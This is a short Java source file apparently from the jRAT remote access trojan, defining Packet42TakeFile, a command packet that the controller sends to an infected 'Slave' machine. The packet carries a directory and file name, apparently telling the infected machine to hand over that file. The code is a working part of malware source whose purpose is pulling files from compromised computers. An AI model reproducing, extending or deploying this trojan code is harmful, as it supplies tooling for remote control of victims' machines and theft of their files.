package pro.jrat.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.Slave;


public class Packet42TakeFile extends AbstractOutgoingPacket {

	private String dir;
	private String name;

	public Packet42TakeFile(String dir, String name) {
		this.dir = dir;
		this.name = name;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(dir);
		slave.writeLine(name);
		
		slave.lock();
	}

	@Override
	public byte getPacketId() {
		return 42;
	}

}
